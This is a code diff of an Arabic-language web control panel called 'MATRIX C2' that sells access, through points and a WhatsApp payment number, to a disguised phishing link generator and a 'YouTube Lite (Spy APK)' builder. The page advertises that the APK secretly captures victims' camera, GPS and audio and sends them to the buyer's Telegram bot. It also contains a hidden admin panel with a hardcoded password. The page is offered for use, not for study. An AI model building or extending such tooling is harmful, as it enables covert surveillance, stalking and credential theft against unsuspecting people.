@@ -3,123 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MATRIX C2 | المنصة المتكاملة</title>
+    <title>MATRIX C2 | CONTROL PANEL</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         :root { --gold: #d4af37; --neon: #00ff41; --bg: #050505; --panel: #111; --text: #e0e0e0; }
-        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
         .container { max-width: 600px; margin: 20px auto; padding: 15px; }
-        
-        /* الهيدر والنقاط */
         .header-bar { background: var(--panel); padding: 15px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--gold); margin-bottom: 20px; }
-        .credit-badge { background: #222; padding: 5px 12px; border-radius: 20px; color: var(--gold); font-weight: bold; border: 1px solid var(--gold); }
-
-        /* الكروت والأنظمة */
+        .credit-badge { background: #222; padding: 8px 15px; border-radius: 20px; color: var(--gold); font-weight: bold; border: 1px solid var(--gold); box-shadow: 0 0 10px rgba(212, 175, 55, 0.2); }
         .card { background: var(--panel); border-radius: 15px; padding: 20px; margin-bottom: 20px; border: 1px solid #222; position: relative; overflow: hidden; }
-        .locked { filter: blur(5px); pointer-events: none; opacity: 0.4; }
-        .lock-overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 5; cursor: pointer; }
-        .lock-btn { background: rgba(0,0,0,0.8); color: var(--gold); border: 2px solid var(--gold); padding: 10px 20px; border-radius: 50px; font-weight: bold; pointer-events: auto; }
-
-        /* الباقات */
-        .price-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
-        .p-card { background: #1a1a1a; padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #333; cursor: pointer; transition: 0.3s; }
-        .p-card:hover { border-color: var(--gold); transform: translateY(-3px); }
-        .p-card h4 { margin: 0; color: var(--gold); font-size: 14px; }
-        .p-card p { margin: 5px 0; font-weight: bold; }
-
-        /* أدوات الإدخال */
+        .locked { filter: blur(4px); pointer-events: none; opacity: 0.5; }
+        .lock-overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 5; }
+        .lock-btn { background: rgba(0,0,0,0.85); color: var(--gold); border: 2px solid var(--gold); padding: 12px 25px; border-radius: 50px; font-weight: bold; cursor: pointer; pointer-events: auto; }
         input, select { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: #fff; border-radius: 8px; margin-top: 10px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; }
         .btn-gold { background: linear-gradient(45deg, var(--gold), #f9d976); color: #000; }
-
-        /* لوحة الأدمن */
-        #master-panel { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; overflow-y: auto; border: 2px solid var(--neon); }
-        .secret-trigger { position: fixed; top: 0; left: 0; width: 50px; height: 50px; opacity: 0; z-index: 1000; cursor: crosshair; }
-        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .stat-item { background: #111; padding: 15px; border-radius: 10px; border-left: 3px solid var(--neon); }
+        .btn-gold:hover { transform: scale(1.02); }
+        #master-panel { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; overflow-y: auto; border: 3px solid var(--neon); }
+        .secret-trigger { position: fixed; top: 0; left: 0; width: 60px; height: 60px; z-index: 1000; cursor: crosshair; }
+        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        .stat-item { background: #111; padding: 15px; border-radius: 10px; border-left: 4px solid var(--neon); }
     </style>
 </head>
 <body>
 
-    <div class="secret-trigger" onclick="adminAuth()"></div>
+    <div class="secret-trigger" onclick="checkAdmin()"></div>
 
     <div class="container">
         <div class="header-bar">
-            <span id="user-id-display" style="font-size: 12px; color: #888;">ID: جاري التحميل...</span>
-            <div class="credit-badge" id="credit-count">3 💎</div>
-        </div>
-
-        <div class="card" id="ref-box">
-            <h3 style="margin:0; color:var(--gold);">🔓 نظام النقاط المجانية</h3>
-            <p style="font-size:12px; color:#888;">ادعو أصدقاءك (كل إحالة = 2 نقطة). تجمع 5 إحالات تفتح الـ VIP مجاناً!</p>
-            <input type="text" id="ref-link" readonly onclick="copyRef()">
-            <p id="ref-status" style="font-size:13px; margin-top:10px;">الإحالات: 0 / 5</p>
+            <span id="user-id-display" style="font-size: 13px; color: var(--gold); font-weight: bold;">ID: ---</span>
+            <div class="credit-badge" id="credit-display">0 💎</div>
         </div>
 
         <div class="card">
-            <h3 style="margin:0; color:var(--gold);">🛒 باقات الشحن والاشتراك</h3>
-            <div class="price-grid">
-                <div class="p-card" onclick="buy('15pts')"><h4>15 نقطة</h4><p>10 جنيهاً</p></div>
-                <div class="p-card" onclick="buy('month')"><h4>اشتراك شهر</h4><p>35 جنيهاً</p></div>
-                <div class="p-card" onclick="buy('6months')"><h4>6 شهور</h4><p>180 جنيهاً</p></div>
-                <div class="p-card" style="grid-column: span 2;" onclick="buy('year')"><h4>سنة كاملة (توفير)</h4><p>380 جنيهاً</p></div>
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="lock-overlay" id="l1" onclick="paywall()"><div class="lock-btn">فتح القسم 🔒</div></div>
+            <div class="lock-overlay" id="l1"><div class="lock-btn" onclick="paywall()">فتح الأدوات 🔒</div></div>
             <div id="c1" class="locked">
-                <h3 style="color:var(--gold);">🎯 مولد الروابط</h3>
-                <input type="text" id="decoy" placeholder="لينك يوتيوب أو إنستا للتمويه">
-                <button class="btn btn-gold" onclick="genLink()">توليد رابط الصيد 🚀</button>
+                <h3 style="margin:0; color:var(--gold);">🎯 رادار الصيد (Links)</h3>
+                <input type="text" id="decoy-url" placeholder="لينك يوتيوب أو فيسبوك للتمويه">
+                <button class="btn btn-gold" onclick="generateMatrixLink()">توليد الرابط المشفر 🚀</button>
             </div>
         </div>
 
         <div class="card">
-            <div class="lock-overlay" id="l2" onclick="paywall()"><div class="lock-btn">فتح القسم 🔒</div></div>
+            <div class="lock-overlay" id="l2"><div class="lock-btn" onclick="paywall()">بناء التطبيق 🔒</div></div>
             <div id="c2" class="locked">
-                <h3 style="color:var(--gold);">📱 YouTube Lite (Spy APK)</h3>
-                <p style="font-size:11px;">تطبيق ملغم يسحب الكاميرا والموقع والصوت.</p>
-                <input type="text" id="apk-token" placeholder="Bot Token">
-                <input type="text" id="apk-id" placeholder="Chat ID">
-                <button class="btn btn-gold" style="background:#fff;" onclick="build()">بناء التطبيق 🏗️</button>
+                <h3 style="margin:0; color:var(--gold);">📱 YouTube Lite (Spy APK)</h3>
+                <p style="font-size:11px; color:#888;">سيتم بناء نسخة خاصة مرتبطة ببوتك لسحب الكاميرا والـ GPS.</p>
+                <input type="text" id="apk-bot" placeholder="Bot Token">
+                <input type="text" id="apk-chatid" placeholder="Chat ID">
+                <button class="btn btn-gold" onclick="requestAPK()">بدء بناء الملف 🏗️</button>
             </div>
+        </div>
+
+        <div class="card">
+            <h3 style="margin:0; color:var(--gold);">💳 شحن الرصيد والـ VIP</h3>
+            <p style="font-size:12px;">تواصل مع الأدمن للشحن اليدوي عبر ID الخاص بك.</p>
+            <button class="btn" style="background:#25d366; color:#fff;" onclick="contactAdmin()">تواصل لشحن رصيدك 💬</button>
         </div>
     </div>
 
     <div id="master-panel">
-        <h2 style="color:var(--neon);">MATRIX WAR ROOM ⚡</h2>
+        <h2 style="color:var(--neon); text-align:center;">MATRIX DASHBOARD ⚡</h2>
         <div class="stat-grid">
-            <div class="stat-item"><small>المستخدمين</small><h3 id="s-users">142</h3></div>
-            <div class="stat-item" style="border-color:var(--gold);"><small>البوتات</small><h3 id="s-bots">56</h3></div>
-        </div>
-        
-        <div style="background:#111; padding:15px; border-radius:10px; margin-bottom:20px;">
-            <h4 style="color:var(--gold); margin-top:0;">🛡️ إعداد البوت الأساسي</h4>
-            <input type="text" id="m-token" placeholder="Master Bot Token">
-            <input type="text" id="m-id" placeholder="Master Chat ID">
-            <button class="btn btn-gold" onclick="saveMaster()">ربط السيرفر بنجاح 🔗</button>
+            <div class="stat-item"><small>المستخدمين النشطين</small><h3 id="admin-total-users">0</h3></div>
+            <div class="stat-item" style="border-color:var(--gold);"><small>عمليات الصيد</small><h3>+500</h3></div>
         </div>
 
-        <button class="btn" style="background:red; color:#fff;" onclick="document.getElementById('master-panel').style.display='none'">إغلاق</button>
+        <div class="card" style="border:1px solid var(--neon);">
+            <h4 style="color:var(--neon); margin-top:0;">💰 نظام شحن المستخدمين</h4>
+            <input type="text" id="target-id" placeholder="ID المستخدم (M-XXXX)">
+            <input type="number" id="pts-amount" placeholder="عدد النقاط">
+            <button class="btn" style="background:var(--neon); color:#000;" onclick="handleAdminCharge()">إرسال النقاط فوراً ✅</button>
+        </div>
+
+        <button class="btn" style="background:#444; color:#fff;" onclick="closeAdmin()">إغلاق اللوحة</button>
     </div>
 
+    <script src="firebase-config.js"></script>
     <script>
-        // --- الأساسيات ---
-        let credits = parseInt(localStorage.getItem('m_credits') || '3');
-        let isVip = localStorage.getItem('m_vip') === 'true';
-        let myID = localStorage.getItem('m_id_user') || 'M-' + Math.random().toString(36).substr(2, 6).toUpperCase();
-        localStorage.setItem('m_id_user', myID);
-
-        window.onload = () => {
-            document.getElementById('user-id-display').innerText = `ID: ${myID}`;
-            document.getElementById('ref-link').value = window.location.href.split('?')[0] + "?ref=" + myID;
-            refreshUI();
-        };
-
+        // تحديث الواجهة عند تغيير البيانات في Firebase
         function refreshUI() {
-            document.getElementById('credit-count').innerText = `${credits} 💎`;
-            if(isVip || credits > 0) {
+            const credits = parseInt(localStorage.getItem('m_credits') || '0');
+            const isVip = localStorage.getItem('m_vip') === 'true';
+            const myID = localStorage.getItem('m_id_user');
+
+            document.getElementById('user-id-display').innerText = `ID: ${myID}`;
+            document.getElementById('credit-display').innerText = `${credits} 💎`;
+
+            if (credits > 0 || isVip) {
                 document.getElementById('l1').style.display = 'none';
                 document.getElementById('c1').classList.remove('locked');
                 document.getElementById('l2').style.display = 'none';
@@ -127,46 +100,42 @@
             }
         }
 
-        // --- وظائف الأدمن ---
-        let clicks = 0;
-        function adminAuth() {
-            clicks++;
-            if(clicks === 5) {
-                let p = prompt("Password:");
-                if(p === "01224815487") document.getElementById('master-panel').style.display = 'block';
-                clicks = 0;
+        // وظائف الأدمن
+        let clickCount = 0;
+        function checkAdmin() {
+            clickCount++;
+            if(clickCount >= 5) {
+                Swal.fire({ title: 'Admin Access', input: 'password', showCancelButton: true })
+                .then((result) => {
+                    if (result.value === "01224815487") {
+                        document.getElementById('master-panel').style.display = 'block';
+                        loadAdminStats();
+                    }
+                });
+                clickCount = 0;
             }
         }
 
-        async function saveMaster() {
-            const t = document.getElementById('m-token').value;
-            const i = document.getElementById('m-id').value;
-            const msg = `🚀 **MATRIX SYSTEM ONLINE**\nتم ربط السيرفر بنجاح يا كينج!`;
-            const res = await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${i}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-            if(res.ok) {
-                localStorage.setItem('master_bot', JSON.stringify({t, i}));
-                Swal.fire('تم الربط', 'وصلتك رسالة تأكيد على البوت', 'success');
-            }
+        function loadAdminStats() {
+            db.ref('users').on('value', (snap) => {
+                document.getElementById('admin-total-users').innerText = snap.numChildren();
+            });
         }
 
-        // --- وظائف عامة ---
-        function paywall() {
-            Swal.fire({
-                title: 'القسم مغلق 🔒',
-                text: 'اجمع إحالات أو اشحن نقاط لفتح الأدوات.',
-                icon: 'warning',
-                showCancelButton: true, confirmButtonText: 'شحن 💳'
-            }).then(r => { if(r.isConfirmed) buy('points_15'); });
+        function handleAdminCharge() {
+            const tid = document.getElementById('target-id').value;
+            const pts = document.getElementById('pts-amount').value;
+            adminAddCredits(tid, pts);
         }
 
-        function buy(type) {
-            const wa = "201224815487";
-            const msg = `عايز أشحن باقة ${type} لحسابي: ${myID}`;
-            window.location.href = `https://wa.me/${wa}?text=${encodeURIComponent(msg)}`;
+        function closeAdmin() { document.getElementById('master-panel').style.display = 'none'; }
+
+        function contactAdmin() {
+            const myID = localStorage.getItem('m_id_user');
+            window.location.href = `https://wa.me/201224815487?text=أريد شحن نقاط لحسابي: ${myID}`;
         }
 
-        function copyRef() { document.getElementById('ref-link').select(); document.execCommand('copy'); Swal.fire('تم النسخ', 'انشره لجمع النقاط', 'success'); }
-        function genLink() { if(credits > 0) { credits--; localStorage.setItem('m_credits', credits); refreshUI(); Swal.fire('تم', 'الرابط في بوتك', 'success'); } }
+        function paywall() { Swal.fire('القسم مغلق', 'تحتاج إلى 1 نقطة على الأقل لفتح الأدوات.', 'warning'); }
     </script>
 </body>
 </html>
